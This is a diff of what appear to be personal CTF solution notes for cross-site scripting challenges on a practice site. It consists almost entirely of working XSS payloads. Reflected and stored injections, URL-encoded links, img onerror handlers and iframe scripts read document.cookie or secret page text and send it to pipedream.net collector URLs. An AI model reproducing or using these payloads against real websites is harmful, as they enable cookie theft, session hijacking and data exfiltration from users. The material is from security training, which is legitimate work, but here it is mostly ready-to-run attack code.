@@ -49,10 +49,10 @@ console.log(c);
 let i = new Image();
 console.log(i);
 i.src = "https://eot2jevtyijbm2l.m.pipedream.net/?cookie=" + c;
-alert('
+let tmp=('
 ```
 
-link: <http://ctf.segfaulthub.com:4343/xss_2/notice_list.php?option_val=username&board_result=');let+c=document.cookie;console.log(c);let+i=new+Image();console.log(i);i.src="https://eot2jevtyijbm2l.m.pipedream.net/?cookie="%2Bc;let+tmp=('&board_search=%F0%9F%94%8D&date_from=&date_to=>
+link: <http://ctf.segfaulthub.com:4343/xss_2/notice_list.php?option_val=username&board_result=');let+c=document.cookie;console.log(c);let+i=new+Image();console.log(i);i.src="https://eoxee0fw4m1u2sw.m.pipedream.net/?cookie="%2Bc;let+tmp=('&board_search=%F0%9F%94%8D&date_from=&date_to=>
 
 # xss3
 notice_list.php의 search 부분은 html entity로 치환
@@ -65,7 +65,7 @@ let i=new Image();
 i.src="https://eot2jevtyijbm2l.m.pipedream.net/?cookie="+c;'>
 ```
 + -> %2B
-
+<img+src=.+onerror='let+c=document.cookit;let+i=new+Image();i.src="https://eoxee0fw4m1u2sw.m.pipedream.net/?cookie="%2Bc;'>
 # xss4
 ## notice_list -> stored xss
 script, alert <- black list filtering
@@ -79,48 +79,16 @@ script, alert <- black list filtering
 
 # xss6
 # login.php
+id=
 ```js
 ');
-let c = document.cookie;
-let i = new Image();
-i.src = "https://eot2jevtyijbm2l.m.pipedream.net/?cookie="+c;
-let tmp = ('
+let c=document.cookie;
+let i=new Image();
+i.src="https://eoxee0fw4m1u2sw.m.pipedream.net/?cookie="+c;
+console.log('
 ```
+pw=1
+id=');let+c="test";let+i=new+Image();i.src="https://eoxee0fw4m1u2sw.m.pipedream.net/?cookie="%2Bc;console.log('&pw=1
 
-link: <http://ctf.segfaulthub.com:4343//xss_7/login.php?id=');let+c=document.cookie;let+i=new+Image();i.src="https://eot2jevtyijbm2l.m.pipedream.net/?cookie="%2Bc;let+tmp=('&pw=>
-
-# Basic Script Prac
-## mypage -> reflected xss
-<img src=. onerror="
-let e = document.querySelectorAll('input')[1].placeholder;
-let i = new Image();
-i.src = 'https://eot2jevtyijbm2l.m.pipedream.net/?cookie=' + e;
-">
-
-# Steal Info
-## notice_list -> stored xss
-<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac/secret.php" id="targetIframe">
-</iframe>
-<script>
-    let f = document.querySelector('iframe').contentWindow;
-    f.addEventListener('load', () => {
-        var e = f.document.getElementsByClassName('card-text')[1].textContent;
-        console.log(f);
-        let i = new Image();
-        i.src = "https://eot2jevtyijbm2l.m.pipedream.net/?cookie=" + e;
-    })
-</script>
-
-# Steal Info 2
-## notice_list -> stored xss
-<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac2/mypage.php" id="targetIframe">
-</iframe>
-<script>
-    let f = document.querySelector('iframe').contentWindow;
-    f.addEventListener('load', () => {
-        let e = f.document.querySelectorAll('input')[1].placeholder;
-        console.log(f);
-        let i = new Image();
-        i.src = "https://eot2jevtyijbm2l.m.pipedream.net/?cookie=" + e;
-    })
-</script>
+link: http://ctf.segfaulthub.com:4343/xss_7/login.php?id=');let+c="test";let+i=new+Image();i.src="https://eoxee0fw4m1u2sw.m.pipedream.net/?cookie="%2Bc;alert(c);alert(i);console.log('&pw=1
+link: http://ctf.segfaulthub.com:4343/xss_7/login.php?id=');let+c=document.cookie;let+i=new+Image();i.src="https://eoxee0fw4m1u2sw.m.pipedream.net/?cookie="%2Bc;console.log(c);console.log('&pw=
